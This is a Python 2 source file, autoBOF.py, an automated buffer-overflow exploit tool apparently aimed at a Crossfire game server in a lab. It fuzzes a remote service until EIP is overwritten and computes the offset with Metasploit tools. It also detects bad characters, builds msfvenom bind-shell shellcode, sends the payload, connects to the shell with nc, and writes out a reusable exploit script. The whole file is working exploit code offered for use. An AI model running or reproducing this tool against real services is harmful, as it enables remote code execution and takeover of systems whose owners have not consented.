#!/usr/bin/python
# -*- coding: utf-8 -*- 
import socket, sys
import os
import time #make fuzzing more robust (sticky note)
if(sys.argv[1] == "-help" or sys.argv[1] == "-h"): #consider two modes - one with user input, and the other with command line logic
 print "Usage: python autoBOF.py -start [initial data sequence including spaces] -end [any post-payload data sequence including spaces] -l [minimum buffer length] [maximum buffer length] -i [number of bytes to increment buffer by for each attempt] -target [remote IP] [remote port] -local [local IP] [shell port] -p [maximum attempts at payload generation] -n [name of exploit] -s [verbose by default, include to minimize stdout] \n\nExample: python autoBOF.py -start \"x11(setup sound \" -end \"x90x00#\" -l 4368 4400 -i 1 -target 127.0.0.1 13327 -local 127.0.0.1 1337 -p 5 -n overflow.py \nAlternatively, type \"python autoBOF.py -config /path/to/file.txt\" to use a configuration file instead" 
 print "--------------------------------------------------------------------------------------------------"
 print "Config file format example:\nstart: \x11(setup sound \nend:\x90\x00#\nlengthMin: 4368\nlengthMax: 4400\nincrement: 1\ntargetIP: 127.0.0.1\ntargetPort: 13327\nlocalIP: 127.0.0.1\nshellPort: 1337\npayloadAttempts: 5\nexploitName: autoExploit.py\nsilent: False"
 print "--------------------------------------------------------------------------------------------------"
 print "IMPORTANT: Requires partner script, restart.py to be running in tandem. Usage for restart.py: Move file to directory containing vulnerable service binary and type \"gdb -q -x restart.py [service name]\""
 sys.exit()
#init vals
curVal = 0
argStart = 'autoBOF' #AutoBOF is uninit value for input checking
argEnd = 'autoBOF'
argLengthMin = 'autoBOF'
argLengthMax = 'autoBOF'
argIncrement = 'autoBOF'
argTargetIP = 'autoBOF'
argTargetPort = 'autoBOF'
argLocalIP = 'autoBOF'
argShellport = 'autoBOF'
argPayloadAttempts = 'autoBOF'
argExploitName = 'autoBOF'
argSilent = False

if(sys.argv[1] != "-config"):
 for x in sys.argv:
  curVal = curVal + 1
  if (x == "-start"):
   argStart = sys.argv[curVal] #Consider escaping these like below
   argStart = argStart.decode('string_escape')
  elif(x == "-end"):
   argEnd = sys.argv[curVal]
   argEnd = argEnd.decode('string_escape')
  elif(x == "-l"):
   argLengthMin = sys.argv[curVal]
   argLengthMax = sys.argv[curVal+1]
  elif(x == "-i"):
   argIncrement = sys.argv[curVal]
  elif(x == "-target"):
   argTargetIP =  sys.argv[curVal]
   argTargetPort = sys.argv[curVal+1]
  elif(x == "-local"):
   argLocalIP = sys.argv[curVal]
   argShellPort = sys.argv[curVal+1]
  elif(x == "-p"):
   argPayloadAttempts = sys.argv[curVal]
  elif(x == "-n"):
   argExploitName = sys.argv[curVal]
  elif(x == "-s"):
   argSilent = True
else:
 fileName = sys.argv[2]
 bufFile = open(fileName,"r")
 configFile = bufFile.read()
 configFile = configFile.split('\n') #newlines are common bad character, so not being able to parse them in config files isn't the worst thing in the world.
 tempIndex = configFile[0].find(':')
 argStart = configFile[0][tempIndex+2:]
 argStart = argStart.decode('string_escape')
 tempIndex = configFile[1].find(':')
 argEnd = configFile[1][tempIndex+2:]
 argEnd = argEnd.decode('string_escape')
 tempIndex = configFile[2].find(':')
 argLengthMin = configFile[2][tempIndex+2:]
 tempIndex = configFile[3].find(':')
 argLengthMax = configFile[3][tempIndex+2:]
 tempIndex = configFile[4].find(':')
 argIncrement = configFile[4][tempIndex+2:]
 tempIndex = configFile[5].find(':')
 argTargetIP = configFile[5][tempIndex+2:]
 tempIndex = configFile[6].find(':')
 argTargetPort = configFile[6][tempIndex+2:]
 tempIndex = configFile[7].find(':')
 argLocalIP = configFile[7][tempIndex+2:]
 tempIndex = configFile[8].find(':')
 argShellPort = configFile[8][tempIndex+2:]
 tempIndex = configFile[9].find(':')
 argPayloadAttempts = configFile[9][tempIndex+2:]
 tempIndex = configFile[10].find(':')
 argExploitName = configFile[10][tempIndex+2:]
 tempIndex = configFile[11].find(':')
 argSilent = configFile[11][tempIndex+2:]
 if (argSilent == "True"):
  argSilent = True
 else:
  argSilent = False
#Check the arguments for proper initialization
if(argStart == 'autoBOF'):
 print 'ERROR: uninitialized start argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argEnd == 'autoBOF'):
 print 'ERROR: uninitialized end argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMin == 'autoBOF' or argLengthMin.isdigit() == False):
 print 'ERROR: uninitialized or invalid minimum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLengthMax == 'autoBOF' or argLengthMax.isdigit() == False):
 print 'ERROR: uninitialized or invalid maximum buffer length argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argIncrement == 'autoBOF' or argIncrement.isdigit() == False):
 print 'ERROR: uninitialized or invalid buffer length increment argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetIP == 'autoBOF'):
 print 'ERROR: uninitialized Target IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argTargetPort == 'autoBOF' or argTargetPort.isdigit() == False):
 print 'ERROR: uninitialized or invalidTarget Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argLocalIP == 'autoBOF'):
 print 'ERROR: uninitialized Local IP argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argShellPort == 'autoBOF' or argShellPort.isdigit() == False):
 print 'ERROR: uninitialized Shell Port argument. Try autoBOF.py -h for more details'
 sys.exit()
if(argPayloadAttempts == 'autoBOF' or argPayloadAttempts.isdigit() == False):
 print 'Warning: Unitialized number of payload attemps. Will be set to 3. Try autoBOF.py -h for more details'
 argPayloadAttempts = 3
if(argExploitName == 'autoBOF'):
 print 'ERROR: uninitialized Exploit Name argument. Try autoBOF.py -h for more details'
 sys.exit()
if(len(argExploitName) < 3):
 print 'ERROR: Exploit name must be at least three characters long'
 sys.exit()
#Start program execution
if(not argSilent):
 os.system("figlet autoBOF") #Optional but very important dependency
host = argTargetIP
port = int(argTargetPort)
buffer = ('\x41')
start = argStart
end = argEnd
isSuccess = False
overflow = buffer
tryUntil = int(argLengthMax)
startCount = int(argLengthMin)
increment = int(argIncrement)
if(not argSilent):
 print "---- Attempting to Crash Service ----"
while(startCount < tryUntil and isSuccess == False):
 try:
  s = socket.socket()
  s.connect((host, port))
  data = s.recv(1024)
  startCount = startCount + increment
  if(not argSilent):
   print "fuzzing at", startCount, "bytes", "out of", tryUntil
  overflow = start + (buffer * startCount) + end
  s.send(overflow)
  s.close()
  time.sleep(.6)
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
 except socket.error, e:
  bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
  eipValue = bufFile.read()
  if("0x41414141" in eipValue):
   if(not argSilent):
    print "---- Service Crashed With EIP overwrite ----"
    print "!! Overflow at",startCount,"bytes"
   isSuccess = True
  break
if(not isSuccess):
 if(not argSilent):
  print "---- Service is Resilient  ----"
  print("No overflow up to"),tryUntil,"bytes"
 sys.exit()

#END OVERFLOW DETECTION
if(not argSilent):
 print("--- Generating Unique Buffer ---")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "
strTest = str(startCount)
bashCommand = bashCommand + strTest + " > offsetStr.txt"
os.system(bashCommand)
bufFile = open("offsetStr.txt", "r")
newBuffer = bufFile.read()
newBuffer = newBuffer.strip('\n')
newBuffer = start + newBuffer + end
s = socket.socket()
s.connect((host, port))
s.send(newBuffer)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
if(not argSilent):
 print("Unique Buffer Sent")
 print("--- Attempting EIP overwrite ---")
bashCommand = "rm offsetStr.txt"
os.system(bashCommand)
s.close()
time.sleep(.6)
bufFile = open("/usr/games/crossfire/bin/eip.txt", "r")
eipValue = bufFile.read()
startValue = eipValue.find("0x")
eipValue = eipValue[startValue:(startValue+10)]
if(not argSilent):
 print ("EIP overwrite successful")
bashCommand = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + strTest + " -q " + eipValue
os.system(bashCommand + " > offset.txt")
bufFile = open("offset.txt")
offset = bufFile.read()
startValue = offset.find("offset")+7
offset = offset[startValue:]
offset = offset.strip('\n')
offset = int(offset)
shellSpace = startCount - offset

if(not argSilent):
 print "Offset is at", offset, "bytes with", (shellSpace), "bytes of post-offset shellcode space"
 ########## Bad Character Phase ##########
 print '--- Bad Character Detection Phase ---'
#removed 00, 0A, OD, FF as common bad characters
badchars_hex = ["\x00", "\x0a", "\x0d", "\xff"]
badchars_text = ["00","0a","0d","ff"]
allchars_hex = ["\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0b","\x0c","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe"]
allchars_text = ["01","02","03","04","05","06","07","08","09","0b","0c","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe"]
bufCount = 0
allchars_unsure_hex = []
allchars_unsure_text = []
while(len(allchars_hex) > 4):
 section_hex = allchars_hex[3] + allchars_hex[2] + allchars_hex[1] + allchars_hex[0]
 section_text = allchars_text[0] + allchars_text[1] + allchars_text[2] + allchars_text[3]
 bufCount = bufCount + 1
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]
 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]
  continue
 else:
  if(not argSilent):
   print "BAD CHARACTER DETECTED IN ", section_text
  #move to unsure variabless
  allchars_unsure_text =  allchars_unsure_text + allchars_text[:4]
  allchars_unsure_hex =  allchars_unsure_hex + allchars_hex[:4]
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]

allchars_unsure_hex = allchars_unsure_hex + allchars_hex
allchars_unsure_text = allchars_unsure_text + allchars_text
if(not argSilent):
 print "unsure values are", allchars_unsure_text
 print "---Verifying Bad Characters ---"
#Final Badchar Verification Phase
while(len(allchars_unsure_hex) > 0):
 section_hex = "\x41" + "\x41" + "\x41" + allchars_unsure_hex[0]
 section_text = allchars_unsure_text[0] + "414141"
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]

 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
 else:
  if(not argSilent):
   print "BADCHAR VERIFIED:", allchars_unsure_text[0]
  badchars_hex.append(allchars_unsure_hex[0])
  badchars_text.append(allchars_unsure_text[0])
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
  continue

if(not argSilent):
 print "Badchar Detection Complete!"
 print "Bad Characters:", badchars_text
 print "Acquiring JMP ESP..."

bufFile = open("/usr/games/crossfire/bin/jmpSearch.txt", "r")
jmpData = bufFile.read()
jmpData = '\n'.join(jmpData.split('\n')[1:])

offset1 = jmpData[8:10].decode("hex")
offset2 = jmpData[6:8].decode("hex")
offset3 = jmpData[4:6].decode("hex")
offset4 = jmpData[2:4].decode("hex")
eipString = offset1 + offset2 + offset3 + offset4
badlist = ""
while (len(badchars_text) > 0):
 badlist = badlist + badchars_text[0]
 badchars_text.pop(0)

badlist = "\\x" + badlist[0:2] + "\\x" + badlist[2:4] + "\\x" + badlist[4:6] + "\\x" + badlist[6:8]
argPayloadAttempts = int(argPayloadAttempts)
bashCommand = "msfvenom -p linux/x86/shell_bind_tcp LPORT=" + argShellPort + " -f raw -b \"" + badlist + "\" -e x86/shikata_ga_nai -o shellcode.txt"
#Payload JMP Offset Detection Phase
eaxLength = len(start)-2
jmpEAXCommand = "(echo \"add eax, "+ str(eaxLength) + "\") | exec /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb > eaxHelp.txt 2>/dev/null"
os.system(jmpEAXCommand)
bufFile = open("eaxHelp.txt")
eaxValue = bufFile.read()
eaxValue = eaxValue.replace("nasm","")
eaxValue = eaxValue.replace(" 00000000 ","")
eaxValue = eaxValue.replace("add eax,byte +0xc","")
eaxValue = eaxValue.replace(" ","")
eaxValue = eaxValue.replace("\n","")
eaxValue = eaxValue.replace(">"," ")
eaxValue = eaxValue[9:]
eaxLength2 = len(eaxValue)
eaxValue = eaxValue[:eaxLength2-9]
eaxLength2 = len(eaxValue)
retString = ""
control = 0
while(eaxLength2 > 0):
 retString = retString + "\\x" + eaxValue[control:control+2]
 eaxLength2 = eaxLength2-2
 control = control + 2
retString = retString.lower()
oldString = retString
retString = retString.decode("string_escape")
#Payload Delivery phase
payloadSuccess = False
while(argPayloadAttempts > 0):
 if(not argSilent):
  print "--- Building Payload ---"
 os.system(bashCommand)
 bufFile = open("shellcode.txt", "r")
 shellcode = bufFile.read()
 newBuffer = start + shellcode + ("\x41" * (offset-len(shellcode))) + eipString + retString + ("\xff\xe0\x90\x90") + end #the hardcoded values tell the program to jump to the prior variable value
 if(not argSilent):
  print "----------------------"
  print "Deploying Payload..."
 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 if(not argSilent):
  print("--- Initiating Bind Shell Connection ---")
 time.sleep(.6)
 output =  os.system("nc -v "+argLocalIP+" "+argShellPort)
 if(output == 0 or output == 2):
  argPayloadAttempts = 0
  payloadSuccess = True
 else:
  print "Connection Failure!"
  argPayloadAttempts = argPayloadAttempts - 1
if(not payloadSuccess):
 if(not argSilent):
  print "Payload Deployment Failed. Exiting program"
 sys.exit()
###Build PayloadFile####
os.system("mv shellcode.txt " + argExploitName[0:3] +"Shellcode.txt")
shebang = "#!/usr/bin/python"
load = "import socket, os, time"
output = "output = 256"
outText = "print \"--- Spawning Shell ---\""
host = "host = \"" + str(argTargetIP) + "\""
port = "port = " + str(argTargetPort)
fileStart = "start = \"" + argStart.encode("string_escape") + "\""
fileEnd = "end = \"" + argEnd.encode("string_escape") + "\""
valOverwrite = "eipString = \"" + eipString.encode("string_escape") + "\""
jmpEax = "jmpEax = \"" + oldString + "\xff\xe0\x90\x90\"".encode("string_escape")
bufOne = "bufFile = open(\"" + argExploitName[0:3] + "Shellcode.txt" + "\", \"r\")"
bufTwo = "shellcode = bufFile.read()"
flow = "flow = \"A\" * " + str(offset-len(shellcode))
code = "buffer = (start + shellcode + flow + eipString + jmpEax + end)"
loopMe = "while(output == 256):"
networking1 = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
networking2 = "s.connect((host, port))"
networking3 = "s.send(buffer)"
networking4 = "os.system(\"nc -v " + str(argTargetIP) + " " + str(argShellPort) + " 2>/dev/null\")" #TODO change argShellPort to a more logical name, like argShellPort
ductTape = "time.sleep(.6)"
fullExploit = shebang + "\n" + load + "\n" + output + "\n" + host  + "\n" + port  + "\n" + fileStart + "\n" + flow + "\n" + fileEnd + "\n" + valOverwrite + "\n" + jmpEax + "\n" + bufOne + "\n" + bufTwo + "\n" + code  + "\n" + outText + "\n" + loopMe +  "\n " + networking1 + "\n " + networking2 + "\n " + networking3 + "\n " + ductTape + "\n " + networking4 + "\n "
savedExploit = open(argExploitName, "w")
savedExploit.write(fullExploit)
savedExploit.close()
if(not argSilent):
 print "----------------------"
 print "Exploit saved as " + argExploitName + ", please keep in the same directory as " +  (argExploitName[0:3] + "Shellcode.txt")
os.system("rm eaxHelp.txt")
os.system("rm offset.txt")
